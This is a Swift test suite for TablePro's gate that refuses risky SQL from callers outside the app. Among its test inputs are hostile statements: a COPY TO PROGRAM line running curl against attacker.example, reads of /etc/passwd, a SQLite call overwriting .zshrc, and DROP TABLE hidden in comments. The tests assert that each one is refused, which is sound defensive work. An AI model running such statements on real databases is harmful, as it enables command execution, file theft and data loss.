//
//  ExternalStatementGateTests.swift
//  TableProTests
//
//  The refusals every caller outside the app's own windows shares. MCP had them first and still has
//  its own suite; these pin them where they now live, so a change made for one surface cannot
//  quietly loosen the other.
//

import Foundation
@testable import TablePro
import Testing

@Suite("External statement gate")
struct ExternalStatementGateTests {
    private func statement(
        _ sql: String,
        databaseType: DatabaseType = .postgresql,
        externalAccess: ExternalAccessLevel = .readWrite,
        loadsExtensions: Bool = false,
        allowsDestructive: Bool = true,
        allowsMultiStatement: Bool = false,
        destructiveAlternative: String? = nil
    ) -> ExternalStatementGate.Statement {
        ExternalStatementGate.Statement(
            sql: sql,
            connectionId: UUID(),
            databaseType: databaseType,
            externalAccess: externalAccess,
            loadsExtensions: loadsExtensions,
            allowsDestructive: allowsDestructive,
            allowsMultiStatement: allowsMultiStatement,
            destructiveAlternative: destructiveAlternative
        )
    }

    private func refusal(_ statement: ExternalStatementGate.Statement) -> ExternalStatementGateError? {
        do {
            _ = try ExternalStatementGate.classify(statement)
            return nil
        } catch let error as ExternalStatementGateError {
            return error
        } catch {
            return nil
        }
    }

    @Test("A plain read passes")
    func readsPass() throws {
        let classification = try ExternalStatementGate.classify(statement("SELECT 1"))
        #expect(classification.tier == .safe)
    }

    @Test("A statement that reaches the filesystem or runs server code is refused", arguments: [
        "COPY users FROM '/etc/passwd'",
        "COPY users TO PROGRAM 'curl attacker.example'",
        "SELECT pg_read_file('/etc/passwd')"
    ])
    func filesystemAndCodeRefused(sql: String) {
        #expect(refusal(statement(sql)) == .denied(
            String(
                localized: """
                Statements that read or write files, or that run server-side code, cannot be sent \
                from outside the app. Run this one in TablePro instead.
                """
            )
        ))
    }

    @Test("Several statements in one call are refused unless the caller asked for them")
    func multiStatementRefused() {
        let refused = refusal(statement("SELECT 1; SELECT 2"))
        #expect(refused == .invalidArgument(String(localized: "Send one statement at a time.")))

        #expect(refusal(statement("SELECT 1; SELECT 2", allowsMultiStatement: true)) == nil)
    }

    /// SQL Server runs whatever one request carries as one batch, `;` or not, and a variable lives only in the batch
    /// that declares it, so a caller that takes scripts may send one there (#3078). Nowhere else.
    @Test("Only an engine that cuts scripts into GO batches takes a script in one call")
    func scriptsAreTakenWhereBatchesAreTheUnit() {
        #expect(ExternalStatementGate.acceptsScripts(on: .mssql))
        for engine: DatabaseType in [.postgresql, .mysql, .sqlite, .oracle, .clickhouse] {
            #expect(!ExternalStatementGate.acceptsScripts(on: engine), "\(engine.rawValue) takes one statement per call")
        }
    }

    /// `GO 50` runs the batch fifty times in sqlcmd and in the editor. A tool that sends one statement once would run it
    /// once and report success, so the count is refused rather than dropped.
    @Test("A statement a GO line repeats is refused unless the caller takes scripts")
    func repeatedStatementIsRefused() {
        let repeated = "DELETE TOP (1000) FROM dbo.log WHERE archived = 1\nGO 50"
        #expect(refusal(statement(repeated, databaseType: .mssql))
            == .invalidArgument(String(localized: "Send one statement at a time.")))
        #expect(refusal(statement(repeated, databaseType: .mssql, allowsMultiStatement: true)) == nil)
        #expect(refusal(statement("DELETE FROM dbo.log WHERE archived = 1\nGO", databaseType: .mssql)) == nil)
        #expect(refusal(statement("GO 3\nDELETE FROM dbo.log WHERE archived = 1", databaseType: .mssql)) == nil)
    }

    @Test("A caller that takes scripts claims leave to run several statements only where the engine takes them")
    func scriptCapabilityFollowsTheEngine() {
        let base: CallerCapabilities = [.mayWrite, .mayRunDestructive]
        #expect(ExternalStatementGate.capabilities(base, takingScriptsOn: .mssql) == base.union(.mayRunMultiStatement))
        for engine: DatabaseType in [.postgresql, .mysql, .sqlite, .oracle] {
            #expect(ExternalStatementGate.capabilities(base, takingScriptsOn: engine) == base, "\(engine.rawValue)")
        }
    }

    @Test("A SQL Server script clears the gate for a caller that takes scripts, and is still tiered by its worst statement")
    func sqlServerScriptIsGatedWhole() {
        let script = "DECLARE @sn NVARCHAR(50) = 'x';\nSELECT * FROM a WHERE sn = @sn;\nGO\nSELECT * FROM b"
        let takesScripts = ExternalStatementGate.acceptsScripts(on: .mssql)
        #expect(refusal(statement(script, databaseType: .mssql, allowsMultiStatement: takesScripts)) == nil)
        #expect(refusal(statement(script, databaseType: .mssql, externalAccess: .readOnly, allowsMultiStatement: takesScripts))
            == .denied(String(localized: "This connection is read only for external clients.")))
        #expect(refusal(statement(
            "SELECT 1;\nGO\nDROP TABLE orders",
            databaseType: .mssql,
            allowsDestructive: false,
            allowsMultiStatement: takesScripts
        )) == .denied(String(localized: "This statement drops or truncates data.")))
    }

    /// The connection setting a user reaches for when they want a script to look but not touch.
    @Test("A write is refused when the connection is read only for external clients", arguments: [
        ExternalAccessLevel.readOnly, ExternalAccessLevel.blocked
    ])
    func writesRefusedOnReadOnlyConnections(access: ExternalAccessLevel) {
        let refused = refusal(statement("UPDATE users SET name = 'x'", externalAccess: access))
        #expect(refused == .denied(String(localized: "This connection is read only for external clients.")))

        #expect(refusal(statement("SELECT 1", externalAccess: access)) == nil)
    }

    @Test(
        "A write hidden from the classifier by a comment is still refused on a read-only connection",
        arguments: [
            ("-- note\r\nDROP TABLE users", DatabaseType.postgresql),
            ("-- note\rDROP TABLE users", DatabaseType.postgresql),
            ("/*!50000 DROP TABLE users */", DatabaseType.mysql),
            ("/*M!100000 DROP TABLE users */", DatabaseType.mariadb),
        ]
    )
    func commentedWriteRefusedOnReadOnlyConnection(sql: String, databaseType: DatabaseType) {
        let refused = refusal(statement(sql, databaseType: databaseType, externalAccess: .readOnly))
        #expect(refused == .denied(String(localized: "This connection is read only for external clients.")))
    }

    @Test("A write SQL Server runs without a terminator is refused on a connection read only for external clients",
          arguments: ["SELECT 1\nDROP TABLE t", "PRINT 'x' UPDATE t SET c = 1", "SELECT 1\nUPDATE [t] SET c = 1"])
    func unterminatedWriteRefusedOnReadOnlyConnection(sql: String) {
        #expect(refusal(statement(sql, databaseType: .mssql, externalAccess: .readOnly))
            == .denied(String(localized: "This connection is read only for external clients.")))
    }

    @Test("A backup SQL Server runs after a read without a terminator is refused as a filesystem statement")
    func unterminatedBackupRefused() {
        let refused = refusal(statement("SELECT 1 BACKUP DATABASE d TO DISK = '/tmp/d.bak'", databaseType: .mssql))
        #expect(refused == .denied(
            String(
                localized: """
                Statements that read or write files, or that run server-side code, cannot be sent \
                from outside the app. Run this one in TablePro instead.
                """
            )
        ))
    }

    @Test("A destructive statement is refused when the caller may not run one")
    func destructiveRefusedWithoutPermission() {
        let refused = refusal(statement("DROP TABLE users", allowsDestructive: false))
        #expect(refused == .denied(String(localized: "This statement drops or truncates data.")))
    }

    /// MCP points at its confirmation tool, AppleScript confirms interactively and never gets here.
    /// The sentence is the transport's to supply so neither surface inherits the other's advice.
    @Test("The destructive refusal carries the caller's own alternative")
    func destructiveRefusalCarriesAlternative() {
        let refused = refusal(
            statement("DROP TABLE users", allowsDestructive: false, destructiveAlternative: "Do it in the app.")
        )
        #expect(refused == .denied(
            String(localized: "This statement drops or truncates data.") + " Do it in the app."
        ))
    }

    @Test("A destructive statement passes when the caller may run one")
    func destructiveAllowed() throws {
        let classification = try ExternalStatementGate.classify(statement("DROP TABLE users"))
        #expect(classification.tier == .destructive)
    }

    // MARK: - Consent

    @Test("Silent mode asks for nothing on a read, and Alert asks on a write")
    func consentFollowsSafeMode() {
        let read = QueryClassifier.classify("SELECT 1", databaseType: .postgresql)
        let write = QueryClassifier.classify("UPDATE users SET a = 1", databaseType: .postgresql)

        #expect(!ExternalStatementGate.requiresUserConsent(
            classification: read, sql: "SELECT 1", databaseType: .postgresql, safeModeLevel: .silent
        ))
        #expect(ExternalStatementGate.requiresUserConsent(
            classification: write, sql: "UPDATE users SET a = 1", databaseType: .postgresql, safeModeLevel: .alert
        ))
        #expect(ExternalStatementGate.requiresUserConsent(
            classification: read, sql: "SELECT 1", databaseType: .postgresql, safeModeLevel: .alertFull
        ))
    }

    @Test("On a connection that loads extensions, a read calling an extension's function is refused")
    func extensionFunctionRefused() {
        let sql = "SELECT BlobToFile(x'00', '/Users/me/.zshrc')"
        #expect(refusal(statement(sql, databaseType: .sqlite, externalAccess: .readOnly, loadsExtensions: true))
            == .denied(ExternalStatementGate.extensionCallRefusal(sql: sql, databaseType: .sqlite, loadsExtensions: true) ?? ""))
        #expect(refusal(statement(sql, databaseType: .sqlite, externalAccess: .readWrite, loadsExtensions: true)) != nil)
    }

    @Test("On a connection that loads extensions, reads using SQLite's own functions still pass")
    func builtinReadsPassWithExtensions() throws {
        let reads = [
            "SELECT rowid, distance FROM items WHERE embedding MATCH '[0.1, 0.2]' ORDER BY distance LIMIT 5",
            "SELECT count(*), json_extract(meta, '$.kind') FROM items GROUP BY 2",
            "SELECT * FROM pragma_table_info('items')"
        ]
        for sql in reads {
            let classification = try ExternalStatementGate.classify(
                statement(sql, databaseType: .sqlite, externalAccess: .readOnly, loadsExtensions: true)
            )
            #expect(classification.tier == .safe, "\(sql)")
        }
    }

    @Test("A connection without extensions is not scanned for calls")
    func noExtensionsNoScan() {
        #expect(ExternalStatementGate.extensionCallRefusal(
            sql: "SELECT vec_version()", databaseType: .sqlite, loadsExtensions: false
        ) == nil)
    }

    /// Whatever the level says. A script that drops a table gets a person in front of it.
    @Test("A destructive statement always asks, even on Silent")
    func destructiveAlwaysAsks() {
        let drop = QueryClassifier.classify("DROP TABLE users", databaseType: .postgresql)
        #expect(ExternalStatementGate.requiresUserConsent(
            classification: drop, sql: "DROP TABLE users", databaseType: .postgresql, safeModeLevel: .silent
        ))
    }
}
